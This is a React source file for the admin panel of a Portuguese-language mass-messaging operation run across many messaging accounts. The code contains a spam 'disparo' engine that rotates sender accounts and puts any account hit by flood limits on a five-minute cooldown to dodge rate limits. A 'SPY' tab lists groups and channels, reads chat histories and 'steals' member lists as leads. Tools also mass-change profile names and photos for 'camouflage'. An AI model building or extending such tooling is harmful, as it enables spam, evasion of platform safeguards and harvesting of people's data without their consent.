import { useState, useEffect, useRef } from 'react';

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [tab, setTab] = useState('dashboard'); 
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  
  // CRM INTELIGENTE
  const [processing, setProcessing] = useState(false);
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  const [imgUrl, setImgUrl] = useState('');
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [progress, setProgress] = useState(0);
  const [checkingStatus, setCheckingStatus] = useState(false);
  const stopCampaignRef = useRef(false);

  // Estados God Mode
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [harvestedIds, setHarvestedIds] = useState(new Set());
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [filterNumber, setFilterNumber] = useState('');
  const [isHarvestingAll, setIsHarvestingAll] = useState(false);
  const [totalHarvestedSession, setTotalHarvestedSession] = useState(0);
  const stopHarvestRef = useRef(false);

  // Tools
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  useEffect(() => {
    const savedGroups = localStorage.getItem('godModeGroups');
    const savedChannels = localStorage.getItem('godModeChannels');
    if (savedGroups) setAllGroups(JSON.parse(savedGroups));
    if (savedChannels) setAllChannels(JSON.parse(savedChannels));
    if (isAuthenticated) fetchData();
  }, [isAuthenticated]);

  const fetchData = async () => {
    try {
      const sRes = await fetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(prev => {
          const newSessions = sData.sessions || [];
          return newSessions.map(ns => {
              const old = prev.find(p => p.phone_number === ns.phone_number);
              return { ...ns, is_active: old ? old.is_active : ns.is_active };
          });
      });
      const stRes = await fetch('/api/stats');
      if (stRes.ok) setStats(await stRes.json());
      const hRes = await fetch('/api/get-harvested');
      const hData = await hRes.json();
      if(hData.harvestedIds) setHarvestedIds(new Set(hData.harvestedIds));
    } catch (e) {}
  };

  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/admin-login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ password: passwordInput }) });
      const data = await res.json();
      if(data.success) setIsAuthenticated(true); else alert('Senha incorreta');
    } catch (e) {}
  };

  // --- MOTOR DE DISPARO INTELIGENTE (COM GELADEIRA) ---
  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas remetentes!');
     if(!confirm(`⚠️ DISPARAR PARA ${stats.pending} LEADS?`)) return;

     setProcessing(true);
     stopCampaignRef.current = false;
     setProgress(0);
     addLog('🚀 Motor V5 (Anti-Flood Inteligente) Iniciado...');
     
     try {
         // Cria uma lista de remetentes disponíveis
         let availableSenders = Array.from(selectedPhones);
         // Mapa de "Geladeira" (Quem tomou flood fica aqui)
         const floodCoolDown = new Map(); 

         const BATCH_SIZE = 8; // Reduzido para garantir entrega
         const DELAY_MS = 3000;
         let totalSent = 0;

         while (true) {
             if (stopCampaignRef.current) { addLog('🛑 Parada solicitada.'); break; }

             // Restaura contas que já saíram da geladeira (após 5 min)
             const now = Date.now();
             for (const [phone, unlockTime] of floodCoolDown.entries()) {
                 if (now > unlockTime) {
                     availableSenders.push(phone);
                     floodCoolDown.delete(phone);
                     addLog(`❄️ Conta ${phone} saiu da geladeira e voltou.`);
                 }
             }

             if (availableSenders.length === 0) {
                 addLog('⚠️ Todas as contas estão em cooldown (Flood). Aguardando 1 min...');
                 await new Promise(r => setTimeout(r, 60000));
                 continue; // Tenta de novo
             }

             const res = await fetch(`/api/get-campaign-leads?limit=100`);
             const data = await res.json();
             const leads = data.leads || [];
             if (leads.length === 0) { addLog('✅ Leads finalizados.'); break; }

             for (let i = 0; i < leads.length; i += BATCH_SIZE) {
                 if (stopCampaignRef.current) break;

                 const batch = leads.slice(i, i + BATCH_SIZE);
                 const promises = batch.map(async (lead, idx) => {
                     // Pega um remetente saudável da lista
                     if (availableSenders.length === 0) return; // Segurança
                     const senderIndex = (totalSent + idx) % availableSenders.length;
                     const sender = availableSenders[senderIndex];

                     try {
                         const resp = await fetch('/api/dispatch', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
                                 senderPhone: sender, 
                                 target: lead.user_id, 
                                 username: lead.username, 
                                 message: msg, 
                                 imageUrl: imgUrl, 
                                 leadDbId: lead.id 
                             })
                         });
                         
                         // Se der erro de Flood (429)
                         if (resp.status === 429) {
                             addLog(`🥶 ${sender} tomou FLOOD. Pausando por 5 min.`);
                             // Remove da lista de ativos
                             availableSenders = availableSenders.filter(p => p !== sender);
                             // Põe na geladeira por 5 min
                             floodCoolDown.set(sender, Date.now() + 300000);
                         } else {
                             const d = await resp.json();
                             if(!d.success) {
                                 // Erros comuns (privacidade) não param a conta
                                 // addLog(`❌ Erro em ${sender}: ${d.error}`); // Opcional para não poluir
                             }
                         }
                     } catch (err) { console.error(err); }
                 });
                 
                 await Promise.all(promises);
                 totalSent += batch.length;
                 setProgress(stats.pending ? Math.round((totalSent / stats.pending) * 100) : 100);
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
         }
         fetchData();
     } catch (e) { addLog(`⛔ Erro: ${e.message}`); }
     setProcessing(false);
  };

  const stopCampaign = () => {
      stopCampaignRef.current = true;
      addLog('🛑 Parando...');
  };

  const checkAllStatus = async () => {
      if(sessions.length === 0) return;
      setCheckingStatus(true);
      addLog('🔍 Verificando status...');
      let curr = [...sessions];
      for(let i=0; i<curr.length; i++) {
          try {
              const res = await fetch('/api/check-status', { method: 'POST', body: JSON.stringify({ phone: curr[i].phone_number }), headers: {'Content-Type': 'application/json'} });
              const data = await res.json();
              curr[i].is_active = (data.status === 'alive');
              setSessions([...curr]); 
          } catch(e) {}
      }
      setCheckingStatus(false);
      addLog('✅ Status atualizado.');
  };

  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  const selectAll = () => {
    const newSet = new Set();
    sessions.forEach(s => { if(s.is_active) newSet.add(s.phone_number) });
    setSelectedPhones(newSet);
    addLog(`✅ ${newSet.size} contas selecionadas.`);
  };

  const handleDeleteSession = async (phone) => {
      if(!confirm('Deletar?')) return;
      await fetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}), headers: {'Content-Type': 'application/json'} });
      setSessions(prev => prev.filter(s => s.phone_number !== phone));
  };

  const startMassHarvest = async () => {
      const targets = [...allGroups, ...allChannels].filter(c => !harvestedIds.has(c.id));
      if (targets.length === 0) return alert("Nada novo.");
      if (!confirm(`Aspirar ${targets.length} fontes?`)) return;
      setIsHarvestingAll(true); stopHarvestRef.current = false;
      let count = 0;
      addLog('🕷️ Iniciando coleta...');
      for (let i = 0; i < targets.length; i++) {
          if (stopHarvestRef.current) break;
          try {
              const res = await fetch('/api/spy/harvest', { method: 'POST', body: JSON.stringify({ phone: targets[i].ownerPhone, chatId: targets[i].id, chatName: targets[i].title, isChannel: targets[i].type === 'Canal' }), headers: {'Content-Type': 'application/json'} });
              const data = await res.json();
              if(data.success) { count += data.count; setTotalHarvestedSession(count); setHarvestedIds(prev => new Set(prev).add(targets[i].id)); addLog(`✅ +${data.count} de ${targets[i].title}`); }
          } catch (e) {}
          await new Promise(r => setTimeout(r, 2000));
      }
      setIsHarvestingAll(false); fetchData();
  };

  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Sem contas.");
      setIsScanning(true); setScanProgress(0);
      let g = [], c = [];
      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i+1)/sessions.length)*100));
          try {
              const res = await fetch('/api/spy/list-chats', { method: 'POST', body: JSON.stringify({ phone }), headers: {'Content-Type': 'application/json'} });
              const data = await res.json();
              if (data.chats) data.chats.forEach(chat => { const obj = {...chat, ownerPhone: phone}; if(chat.type === 'Canal') c.push(obj); else g.push(obj); });
          } catch (e) {}
      }
      const ug = [...new Map(g.map(i => [i.id, i])).values()].sort((a,b)=>b.participantsCount-a.participantsCount);
      const uc = [...new Map(c.map(i => [i.id, i])).values()].sort((a,b)=>b.participantsCount-a.participantsCount);
      setAllGroups(ug); setAllChannels(uc);
      localStorage.setItem('godModeGroups', JSON.stringify(ug)); localStorage.setItem('godModeChannels', JSON.stringify(uc));
      setIsScanning(false);
  };

  const handleMassUpdateProfile = async () => {
    if (selectedPhones.size === 0) return alert('Selecione contas!');
    setProcessing(true);
    for (const phone of Array.from(selectedPhones)) await fetch('/api/update-profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, newName, photoUrl }) });
    setProcessing(false); addLog('✅ Perfis atualizados.');
  };

  const handleMassPostStory = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) await fetch('/api/post-story', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
      setProcessing(false); addLog('✅ Stories postados.');
  };

  const openChatViewer = async (chat) => { 
      setViewingChat(chat); setLoadingHistory(true); setChatHistory([]);
      try {
        const res = await fetch('/api/spy/get-history', { method: 'POST', body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }), headers: {'Content-Type': 'application/json'} });
        const data = await res.json(); setChatHistory(data.history || []);
      } catch (e) {}
      setLoadingHistory(false);
  };
  
  const stealLeadsManual = async (chat) => {
      addLog(`🕷️ Roubando ${chat.title}...`);
      const res = await fetch('/api/spy/harvest', { method: 'POST', body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id, chatName: chat.title, isChannel: chat.type === 'Canal' }), headers: {'Content-Type': 'application/json'} });
      const data = await res.json();
      if(data.success) { addLog(`✅ +${data.count} leads.`); setHarvestedIds(prev => new Set(prev).add(chat.id)); }
  };

  const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
  const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;

  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
          <form onSubmit={handleLogin}><input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha Mestra" style={{padding:'15px', borderRadius:'8px'}}/></form>
      </div>
  );

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
        <div style={{marginBottom:'20px', borderBottom:'1px solid #30363d', paddingBottom:'10px'}}>
            <button onClick={()=>setTab('dashboard')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', border:'1px solid #238636', color:'white', borderRadius:'5px', cursor:'pointer'}}>🚀 CRM</button>
            <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', border:'1px solid #8957e5', color:'white', borderRadius:'5px', cursor:'pointer'}}>👁️ SPY</button>
            <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', border:'1px solid #1f6feb', color:'white', borderRadius:'5px', cursor:'pointer'}}>🛠️ TOOLS</button>
        </div>

        {tab === 'dashboard' && (
            <div style={{display:'grid', gridTemplateColumns:'2fr 1fr', gap:'20px'}}>
                <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                    <div style={{display:'flex', gap:'20px', marginBottom:'20px'}}>
                        <div style={{flex:1, background:'#0d1117', border:'1px solid #d29922', padding:'15px', textAlign:'center'}}><h2>{stats.pending?.toLocaleString()}</h2><small>Pendentes</small></div>
                        <div style={{flex:1, background:'#0d1117', border:'1px solid #238636', padding:'15px', textAlign:'center'}}><h2>{stats.sent?.toLocaleString()}</h2><small>Enviados</small></div>
                    </div>
                    <input type="text" placeholder="URL Imagem" value={imgUrl} onChange={e=>setImgUrl(e.target.value)} style={{width:'100%', padding:'10px', marginBottom:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d'}} />
                    <textarea value={msg} onChange={e=>setMsg(e.target.value)} placeholder="Mensagem..." style={{width:'100%', height:'100px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'10px'}}/>
                    
                    <div style={{display:'flex', gap:'10px', marginTop:'15px'}}>
                        {!processing ? (
                            <button onClick={startRealCampaign} style={{flex:1, padding:'20px', background:'#238636', color:'white', border:'none', cursor:'pointer', fontWeight:'bold'}}>INICIAR DISPARO V5</button>
                        ) : (
                            <button onClick={stopCampaign} style={{flex:1, padding:'20px', background:'#f85149', color:'white', border:'none', cursor:'pointer', fontWeight:'bold'}}>🛑 PARAR DISPARO</button>
                        )}
                    </div>

                    <div style={{marginTop:'20px', height:'200px', overflowY:'auto', background:'#000', padding:'10px', fontSize:'12px', color:'#00ff00'}}>
                        {logs.map((l,i)=><div key={i}>{l}</div>)}
                    </div>
                </div>

                <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                    <div style={{display:'flex', justifyContent:'space-between', marginBottom:'10px'}}>
                        <h3>Contas ({sessions.length})</h3>
                        <button onClick={checkAllStatus} disabled={checkingStatus} style={{fontSize:'10px', padding:'5px'}}>CHECK</button>
                    </div>
                    <button onClick={selectAll} style={{width:'100%', padding:'10px', background:'#30363d', color:'white', marginBottom:'10px', border:'none', cursor:'pointer'}}>SELECIONAR ONLINE</button>
                    <div style={{maxHeight:'500px', overflowY:'auto'}}>
                        {sessions.map(s => (
                            <div key={s.id} style={{padding:'10px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between'}}>
                                <span style={{color: s.is_active?'#00ff00':'#ff0000'}}>{s.phone_number}</span>
                                <input type="checkbox" checked={selectedPhones.has(s.phone_number)} onChange={()=>toggleSelect(s.phone_number)} />
                                <button onClick={()=>handleDeleteSession(s.phone_number)} style={{background:'none', border:'none', cursor:'pointer'}}>🗑️</button>
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        )}

        {tab === 'spy' && (
            <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
                     <button onClick={startMassHarvest} disabled={isHarvestingAll} style={{padding:'10px', background:'#238636', color:'white', border:'none', cursor:'pointer'}}>{isHarvestingAll ? 'ASPIRANDO...' : 'ASPIRAR TUDO'}</button>
                     <button onClick={() => stopHarvestRef.current = true} style={{padding:'10px', background:'#f85149', color:'white', border:'none', cursor:'pointer'}}>PARAR</button>
                     <button onClick={scanNetwork} disabled={isScanning} style={{padding:'10px', background:'#8957e5', color:'white', border:'none', cursor:'pointer'}}>SCAN</button>
                     <input type="text" placeholder="Filtrar" value={filterNumber} onChange={e => setFilterNumber(e.target.value)} style={{padding:'10px', background:'#0d1117', border:'1px solid #30363d', color:'white', width:'150px'}}/>
                </div>
                <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
                    <div>
                        <h4>GRUPOS ({filteredGroups.length})</h4>
                        <div style={{maxHeight:'500px', overflowY:'auto'}}>
                            {filteredGroups.map(g => (
                                <div key={g.id} style={{padding:'10px', borderBottom:'1px solid #21262d', opacity: harvestedIds.has(g.id) ? 0.5 : 1, display:'flex', justifyContent:'space-between'}}>
                                    <div>{g.title} {harvestedIds.has(g.id) && '✅'} <small>({g.participantsCount})</small></div>
                                    <button onClick={()=>stealLeadsManual(g)} style={{fontSize:'10px'}}>ROUBAR</button>
                                </div>
                            ))}
                        </div>
                    </div>
                    <div>
                        <h4>CANAIS ({filteredChannels.length})</h4>
                        <div style={{maxHeight:'500px', overflowY:'auto'}}>
                            {filteredChannels.map(c => (
                                <div key={c.id} style={{padding:'10px', borderBottom:'1px solid #21262d', opacity: harvestedIds.has(c.id) ? 0.5 : 1, display:'flex', justifyContent:'space-between'}}>
                                    <div>{c.title} {harvestedIds.has(c.id) && '✅'} <small>({c.participantsCount})</small></div>
                                    <button onClick={()=>stealLeadsManual(c)} style={{fontSize:'10px'}}>ROUBAR</button>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        )}
        
        {tab === 'tools' && (
             <div style={{ padding: '20px', background: '#161b22' }}>
                <h3>Camuflagem</h3>
                <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px' }} />
                <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px' }} />
                <button onClick={handleMassUpdateProfile} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR</button>
                
                <h3 style={{marginTop:'30px'}}>Stories</h3>
                <input type="text" placeholder="Mídia URL" value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px' }} />
                <button onClick={handleMassPostStory} style={{ width: '100%', padding: '10px', background: '#1f6feb', color: 'white', border: 'none' }}>POSTAR</button>
            </div>
        )}
    </div>
  );
}
